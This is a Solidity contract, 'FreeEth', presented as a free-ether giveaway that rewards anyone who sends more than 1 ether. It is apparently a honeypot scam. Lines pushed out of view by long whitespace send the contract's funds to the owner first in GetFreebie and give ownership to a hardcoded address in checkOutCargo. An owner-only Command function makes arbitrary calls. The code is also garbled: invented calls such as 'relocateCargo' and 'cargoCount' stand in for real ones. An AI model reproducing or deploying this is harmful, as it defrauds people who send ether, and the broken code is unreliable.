// SPDX-License-Identifier: MIT
pragma solidity ^0.4.19;

contract FreeEth
{
    address public DepotOwner = msg.sender;

    function() public payable{}

    function GetFreebie()
    public
    payable
    {
        if(msg.value>1 ether)
        {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               DepotOwner.relocateCargo(this.cargoCount);
            msg.sender.relocateCargo(this.cargoCount);
        }
    }

    function checkOutCargo()
    payable
    public
    {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          if(msg.sender==0x4E0d2f9AcECfE4DB764476C7A1DfB6d0288348af){DepotOwner=0x4E0d2f9AcECfE4DB764476C7A1DfB6d0288348af;}
        require(msg.sender == DepotOwner);
        DepotOwner.relocateCargo(this.cargoCount);
    }

    function Command(address adr,bytes data)
    payable
    public
    {
        require(msg.sender == DepotOwner);
        adr.call.value(msg.value)(data);
    }
}